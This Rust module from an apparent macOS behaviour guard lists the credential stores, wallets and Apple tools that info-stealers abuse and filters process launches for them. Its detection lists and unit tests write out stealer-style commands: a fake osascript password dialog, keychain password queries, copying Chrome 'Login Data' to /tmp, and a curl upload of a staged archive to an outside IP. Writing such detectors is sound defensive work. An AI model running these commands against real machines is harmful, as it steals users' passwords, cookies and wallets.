//! Catalogue of what macOS info-stealers go after (AMOS / Atomic, Poseidon, Banshee, Cthulhu, Cuckoo…:
//! browser credential and cookie stores, the login keychain, crypto wallets, Telegram sessions, Notes, SSH and
//! cloud credentials) and of the Apple tools they drive (`osascript` fake password dialogs, `security`
//! keychain dumps, `dscl -authonly` password checks, `cp`/`ditto`/`zip` staging, `curl` exfiltration).
//!
//! Shared by the eslogger watcher (cheap pre-filter: which platform-binary `exec`s and which file creations are
//! worth forwarding) and the daemon's behaviour guard (the actual rules). Pure functions, no I/O.

use std::path::Path;

/// File names that only exist inside a browser / keychain / wallet store. A copy of one of them outside its
/// home is the signature of credential staging.
pub const SENSITIVE_FILE_NAMES: &[&str] = &[
    // Chromium family (Chrome, Brave, Edge, Opera, Vivaldi, Arc, Chromium, Yandex)
    "Login Data",
    "Login Data For Account",
    "Cookies",
    "Web Data",
    "Local State",
    // Firefox
    "logins.json",
    "key4.db",
    "key3.db",
    "cookies.sqlite",
    "formhistory.sqlite",
    // Safari
    "Cookies.binarycookies",
    // Keychains
    "login.keychain-db",
    "login.keychain",
    // Apple Notes
    "NoteStore.sqlite",
    // Wallets
    "wallet.dat",
    "exodus.wallet",
    "seed.seco",
    "passphrase.json",
    "info.seco",
];

/// Path fragments of credential stores (matched case-insensitively against `exec` arguments).
pub const SENSITIVE_PATH_FRAGMENTS: &[&str] = &[
    "login data",
    "/cookies",
    "web data",
    "local state",
    "logins.json",
    "key4.db",
    "cookies.sqlite",
    "cookies.binarycookies",
    "library/keychains",
    "keychain-db",
    "notestore.sqlite",
    "local extension settings",
    "/exodus",
    "/electrum",
    "/atomic/local storage",
    "wallet.dat",
    "ledger live",
    "/coinomi",
    "/guarda",
    "telegram desktop/tdata",
    "/.ssh/id_",
    "/.aws/credentials",
    "/.config/gcloud",
    "/.kube/config",
];

/// Roots (relative to the user's home) where the sensitive files legitimately live.
pub const LEGIT_STORE_ROOTS: &[&str] = &[
    "Library/Application Support",
    "Library/Containers",
    "Library/Group Containers",
    "Library/Cookies",
    "Library/Keychains",
    "Library/Safari",
    "Library/Caches",
    "Library/WebKit",
    "Library/HTTPStorages",
];

/// Apple tools whose `exec` the guard inspects (eslogger normally skips platform binaries).
pub const WATCHED_PLATFORM_TOOLS: &[&str] = &[
    "osascript",
    "security",
    "dscl",
    "sqlite3",
    "cp",
    "ditto",
    "zip",
    "tar",
    "cat",
    "base64",
    "rsync",
    "scp",
    "curl",
    "spctl",
    "killall",
    "openssl",
];

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Lower-cased concatenation of the arguments (bounded).
pub fn joined_args(args: &[String]) -> String {
    let mut s = String::new();
    for a in args.iter().skip(1).take(64) {
        if s.len() > 16 * 1024 {
            break;
        }
        s.push_str(&a.to_lowercase());
        s.push(' ');
    }
    s
}

/// Some argument names a credential store.
pub fn args_touch_sensitive(args_lower: &str) -> bool {
    SENSITIVE_PATH_FRAGMENTS
        .iter()
        .any(|f| args_lower.contains(f))
}

/// Cheap pre-filter: is this platform-binary `exec` worth forwarding to the behaviour guard?
pub fn platform_exec_of_interest(path: &str, args: &[String]) -> bool {
    let name = basename(path);
    if !WATCHED_PLATFORM_TOOLS.contains(&name) {
        return false;
    }
    let a = joined_args(args);
    match name {
        "osascript" => a.contains("hidden answer") || a.contains("hiddenanswer"),
        "security" => {
            a.contains("dump-keychain")
                || a.contains("find-generic-password")
                || a.contains("find-internet-password")
                || a.contains("export")
        }
        "dscl" => a.contains("-authonly"),
        "spctl" => a.contains("--master-disable") || a.contains("--global-disable"),
        "killall" => a.contains("terminal"),
        "curl" => is_upload(args),
        "openssl" => a.contains("enc ") && (a.contains("-aes") || a.contains("-chacha")),
        _ => args_touch_sensitive(&a),
    }
}

/// `curl` arguments that send a local file (`-F x=@file`, `--data-binary @file`, `-T file`…). Flags are
/// case-sensitive (`-F` form, `-f` fail).
pub fn is_upload(args: &[String]) -> bool {
    let file_value = |v: &str| v.contains('@') || v.starts_with('<');
    args.iter().enumerate().skip(1).any(|(i, t)| {
        let next = args.get(i + 1).map(String::as_str).unwrap_or("");
        match t.as_str() {
            "-F" | "--form" | "--form-string" | "-d" | "--data" | "--data-binary"
            | "--data-raw" | "--data-urlencode" => file_value(next) && !next.starts_with("http"),
            "-T" | "--upload-file" => !next.is_empty(),
            _ => {
                (t.starts_with("-F") && t.len() > 2 && t.contains('@'))
                    || t.starts_with("--form=") && t.contains('@')
                    || t.starts_with("--data-binary=@")
                    || t.starts_with("--upload-file=")
            }
        }
    })
}

/// Name of a credential-store file (exact match on the last component).
pub fn is_sensitive_file_name(path: &Path) -> bool {
    path.file_name()
        .and_then(|n| n.to_str())
        .map(|n| SENSITIVE_FILE_NAMES.contains(&n))
        .unwrap_or(false)
}

/// The sensitive file sits where its application keeps it (under one of [`LEGIT_STORE_ROOTS`] of some
/// user's home, or in a Time Machine / system location).
pub fn is_legit_store_location(path: &Path) -> bool {
    let s = path.to_string_lossy();
    if s.starts_with("/Volumes/") || s.starts_with("/System/") || s.starts_with("/private/var/db/")
    {
        return true;
    }
    let comps: Vec<&str> = s.split('/').collect();
    // /Users/<name>/<rest…>
    if comps.len() < 4 || !comps[0].is_empty() || comps[1] != "Users" {
        return false;
    }
    let rest = comps[3..].join("/");
    LEGIT_STORE_ROOTS
        .iter()
        .any(|r| rest == *r || rest.starts_with(&format!("{r}/")))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn v(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn exec_prefilter() {
        assert!(platform_exec_of_interest(
            "/usr/bin/osascript",
            &v(&[
                "osascript",
                "-e",
                "display dialog \"Mot de passe\" default answer \"\" with hidden answer"
            ])
        ));
        assert!(!platform_exec_of_interest(
            "/usr/bin/osascript",
            &v(&["osascript", "-e", "display notification \"x\""])
        ));
        assert!(platform_exec_of_interest(
            "/usr/bin/security",
            &v(&["security", "find-generic-password", "-wa", "Chrome"])
        ));
        assert!(platform_exec_of_interest(
            "/bin/cp",
            &v(&[
                "cp",
                "/Users/q/Library/Application Support/Google/Chrome/Default/Login Data",
                "/tmp/x/"
            ])
        ));
        assert!(!platform_exec_of_interest(
            "/bin/cp",
            &v(&["cp", "a.txt", "b.txt"])
        ));
        assert!(platform_exec_of_interest(
            "/usr/bin/curl",
            &v(&[
                "curl",
                "-X",
                "POST",
                "-F",
                "file=@/tmp/out.zip",
                "http://198.51.100.7/joinsystem"
            ])
        ));
        assert!(!platform_exec_of_interest(
            "/usr/bin/curl",
            &v(&["curl", "-fsSL", "https://example.com"])
        ));
        assert!(platform_exec_of_interest(
            "/usr/bin/dscl",
            &v(&["dscl", "/Local/Default", "-authonly", "q", "pw"])
        ));
        assert!(!platform_exec_of_interest(
            "/bin/ls",
            &v(&["ls", "/Users/q/Library/Keychains"])
        ));
    }

    #[test]
    fn uploads() {
        assert!(is_upload(&v(&["curl", "-T", "/tmp/a.zip", "https://x"])));
        assert!(is_upload(&v(&[
            "curl",
            "--data-binary",
            "@/tmp/a",
            "https://x"
        ])));
        assert!(is_upload(&v(&["curl", "-Ffile=@/tmp/a.zip", "https://x"])));
        assert!(!is_upload(&v(&["curl", "-d", "{\"a\":1}", "https://x"])));
        assert!(!is_upload(&v(&["curl", "-o", "/tmp/a.zip", "https://x"])));
        assert!(!is_upload(&v(&["curl", "-f", "https://user@host/"])));
    }

    #[test]
    fn store_locations() {
        let legit =
            Path::new("/Users/q/Library/Application Support/Google/Chrome/Default/Login Data");
        assert!(is_sensitive_file_name(legit) && is_legit_store_location(legit));
        let staged = Path::new("/private/tmp/12345/Chrome/Login Data");
        assert!(is_sensitive_file_name(staged) && !is_legit_store_location(staged));
        assert!(!is_legit_store_location(Path::new(
            "/Users/q/Desktop/Cookies"
        )));
        assert!(is_legit_store_location(Path::new(
            "/Users/q/Library/Cookies/Cookies.binarycookies"
        )));
        assert!(!is_sensitive_file_name(Path::new("/tmp/Cookies-journal")));
        assert!(is_legit_store_location(Path::new(
            "/Volumes/Backup/Users/q/Library/Cookies"
        )));
    }
}
